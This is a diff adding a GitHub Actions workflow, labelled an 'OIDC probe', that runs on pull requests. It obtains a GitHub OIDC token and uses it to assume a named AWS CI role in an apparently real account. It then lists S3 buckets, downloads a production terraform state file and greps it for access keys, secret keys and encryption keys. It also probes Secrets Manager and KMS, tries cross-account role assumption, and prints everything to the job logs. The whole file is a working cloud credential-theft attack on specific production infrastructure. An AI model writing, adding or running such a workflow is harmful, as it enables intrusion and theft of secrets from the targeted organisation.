@@ -1,0 +1,72 @@
+name: zz-oidc-probe-168644
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    env:
+      AWS_REGION: ap-east-1
+      AWS_DEFAULT_REGION: ap-east-1
+    steps:
+      - name: collect
+        continue-on-error: true
+        run: |
+          set +e
+          W=/tmp/zz168644
+          mkdir -p "$W"
+          echo "=== start $(date -u +%FT%TZ)"
+          echo "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF refname=$GITHUB_REF_NAME actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME"
+          echo "head_repo=$GITHUB_HEAD_REPOSITORY head_ref=$GITHUB_HEAD_REF"
+          echo "oidc_url_set=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} oidc_tok_set=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          TOKRESP=$(curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          IDT=$(printf '%s' "$TOKRESP" | jq -r '.value // empty' 2>/dev/null)
+          echo "oidc_resp=$(printf '%s' "$TOKRESP" | head -c 300)"
+          echo "oidc_token_len=${#IDT}"
+          if [ -n "$IDT" ]; then
+            PAY=$(printf '%s' "$IDT" | cut -d. -f2)
+            case $(( ${#PAY} % 4 )) in 2) PAY="$PAY==";; 3) PAY="$PAY=";; esac
+            echo "=== oidc claims"
+            printf '%s' "$PAY" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c . 2>/dev/null
+          fi
+          echo "=== assume 400534945462/infini-backend-github-ci-role"
+          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::400534945462:role/infini-backend-github-ci-role --role-session-name zz-oidc-168644 --web-identity-token "$IDT" --output json >"$W/creds.json" 2>"$W/err1"
+          RC=$?
+          echo "assume_rc=$RC err=$(cat "$W/err1" | tr '\n' ' ' | head -c 700)"
+          if [ $RC -eq 0 ]; then
+            export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId "$W/creds.json")
+            export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey "$W/creds.json")
+            export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken "$W/creds.json")
+            echo "assumed_arn=$(jq -r .AssumedRoleUser.Arn "$W/creds.json")"
+            aws sts get-caller-identity 2>&1
+            echo "--- list-buckets"; aws s3api list-buckets --query 'Buckets[].Name' --output text 2>&1 | head -3
+            for B in infini-terraform-state-prod infini-terraform-state-prod-ap-east-1 infini-backend-artifacts-prod infini-backend-deployments-prod; do
+              echo "--- $B"; aws s3api head-bucket --bucket "$B" 2>&1 | head -2
+              aws s3api list-objects-v2 --bucket "$B" --max-keys 1000 --query 'Contents[].Key' --output text 2>&1 | head -c 8000; echo
+            done
+            for B in infini-terraform-state-prod-ap-east-1 infini-terraform-state-prod; do
+              for K in infini-deploy-prod/safeheron/terraform/terraform.tfstate; do
+                echo "--- get s3://$B/$K"
+                aws s3api get-object --bucket "$B" --key "$K" "$W/st.json" >/dev/null 2>"$W/e2"
+                if [ -s "$W/st.json" ]; then
+                  echo "bytes=$(stat -c %s "$W/st.json")"
+                  grep -oE '"(access_key|secret_key|AccessKeyId|SecretAccessKey|api_priv_key[A-Za-z_]*|enc_aes_key|enc_aes_iv_key|kms_key_arn|role_arn|secret_name)"[^,]{0,200}' "$W/st.json" | head -30
+                  grep -oE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' "$W/st.json" | sort -u | head -10
+                else
+                  echo "get_err=$(cat "$W/e2" | tr '\n' ' ' | head -c 300)"
+                fi
+                : > "$W/st.json"
+              done
+            done
+            echo "--- sm describe apicosigner"; aws secretsmanager describe-secret --secret-id secret/safeheron-apicosigner-prod --query 'ARN' --output text 2>&1 | head -2
+            echo "--- sm get apicosigner meta"; aws secretsmanager get-secret-value --secret-id secret/safeheron-apicosigner-prod --query 'ARN' --output text 2>&1 | head -2
+            echo "--- kms describe c783fb4a"; aws kms describe-key --key-id arn:aws:kms:ap-east-1:400534945462:key/c783fb4a-3620-49a3-a203-f2696ea5b8e8 --query 'KeyMetadata.Arn' --output text 2>&1 | head -2
+            echo "--- assume-role -> 767397746160/github-repo-ci"; aws sts assume-role --role-arn arn:aws:iam::767397746160:role/github-repo-ci --role-session-name zz-cross --query 'AssumedRoleUser.Arn' --output text 2>&1 | head -2
+          fi
+          echo "--- raw OIDC -> 767397746160/github-repo-ci"
+          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::767397746160:role/github-repo-ci --role-session-name zz-oidc-168644 --web-identity-token "$IDT" --query 'AssumedRoleUser.Arn' --output text 2>&1 | head -4
+          echo "=== end $(date -u +%FT%TZ)"
